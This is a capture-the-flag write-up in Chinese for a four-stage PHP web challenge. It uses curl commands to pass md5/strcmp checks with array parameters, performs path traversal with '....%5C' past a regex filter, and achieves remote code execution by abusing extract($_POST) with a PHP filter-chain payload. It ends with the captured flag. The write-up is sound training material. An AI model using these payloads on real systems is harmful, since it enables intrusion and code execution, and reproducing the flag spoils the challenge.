#Web 

## 題目
This challenge has 4 stage, enjoy it! 
給兩個連結：
- Go to stage1：http://chals1:20010/stage1.php
- Dockerfile：http://chals1:20010/Dockerfile
  ```
  FROM php:7.4.33-apache

	RUN chown -R www-data:www-data /var/www/html && \
	    chmod -R 555 /var/www/html
	
	ARG FLAG
	RUN echo $FLAG > /flag_`cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1`
	
	USER www-data
  ```

## 解題
#### Stage 1
![[W1-11_s1.png|center|348]]
1. 檢查網頁原始碼，發現要求
   ```
   if ($A != $B)                    // 要求「不相等」
		if (strcmp($A, $B) == 0)     // 但 strcmp 要回傳 0
	        if (md5($A) === md5($B)) // md5 雜湊字串要完全相同
   ```
	>[!abstract] php 7.x 前的特性
	>`strcmp()` 和 `md5()` 這類內建函式，如果 input 參數是「陣列」而不是字串，PHP 會印一個 Warning 並回傳 `NULL`

	-> 可以讓 A、B 是內容不同的陣列！
2. 設定 A、B 的值
   ```
   curl -sG "http://chals1:20010/stage1.php" \
	  --data-urlencode "A[]=1" \
	  --data-urlencode "B[]=2" \
	  --output -
   ```
   ![[W1-11_2s2.png|554]]
stage 2 link: `http://chals1:20010/stage2_212ad0bdc4777028af057616450f6654.php`
#### Stage 2
![[W1-11_s2.png|center]]
1. 檢查網頁原始碼，發現要求
   ```
   if ($A !== $B)
        if (md5($A) == 0 and md5($B) === 0)
   ```
2. 用 [[#Stage 1]] 一樣的方式可以通過
   ```
   curl -sG "http://chals1:20010/stage2_212ad0bdc4777028af057616450f6654.php" \
	  --data-urlencode "A[]=1" \
	  --data-urlencode "B[]=2" \
	  --output -
   ```
   ![[W1-11_2s3.png]]
stage 3 link: `http://chals1:20010/stage3_099b3b060154898840f0ebdfb46ec78f.php?page=swirl.php`
#### Stage 3
![[W1-11_s3.png|center|408]]
1. 檢查網頁發現
   - 網址出現 `?page=` -> 可以利用 pathwalker 漏洞
   - 要求
     1. 禁止 `preg_match("/\\_|\//", $path))` 
        PHP 字串解析 `\\`會解析為 `\` --> `"/\_|\//"`
        regex 解析，regex 開頭結尾以 `/` 包著 --> 匹配 `"\_|\/"`
        其中 `|` 是 or，`\[符號]` 會辨別為 `[符號]` -> 匹配 `"_"` or `"/"`
        -->  只檢查底線 和 斜線，<mark style="background: #FFF3A3A6;">沒有檢查反斜線！</mark>
     2. 【法一】
        `str_replace("..\\", "../", $path)`、`str_replace("..", ".", $path)` 
        --> `....\\` -> `..../` -> `../` -> 可以進行 pathwalk 了
        【法二】
        用 `%5c` 代替 '/'，`..` 仍然寫做 `....`
1. 嘗試 pathwalk：
   原始碼中有 `include('config.php')`，先在網址列後面加上 `?page=....%5Cconfig.php`
   ![[W1-11_2S4.png]]
   在原始碼中發現資訊 `$stage4 = "stage4_b182g38e7db23o8eo8qwdehb23asd311.php"`
2. stage 4 link: `stage4_b182g38e7db23o8eo8qwdehb23asd311.php`

#### Stage 4
![[W1-11_s4.png|355]]
1. 解讀程式碼：
	1. `extract($_POST)`：把使用者輸入直接變成變數
	   >假設 POST `name=abc`，程式中會變成 `$name = "abc";`
	   
	2. `if (isset($👀))`，檢查是否存在 -> 需要 POST `👀=[我們要的指令]`
2. 把我們要的指令（先測試 `id`）編寫成 filter chain
   ```
   CHAIN=$(python3 php_filter_chain_generator.py --chain '<?=`id`;?>' | tail -n 1)
   ```
   接著指定 👀為產生的 filter chain 並送出
   ```
   curl -sX POST "http://chals1:20010/stage4_b182g38e7db23o8eo8qwdehb23asd311.php"   --data-urlencode "👀=$CHAIN"   --output -
   ```
   ![[W1-11_s4-id.png|604]]
   --> 可以執行
3. `ls` 查找 + `cat` 擷取 flag
   ![[W1-11_s4-ls.png|654]]
   ![[W1-11_s4-flag.png]]
4. flag = `CTF{swirl_8e1ac3aec48d2e151b37b922}`


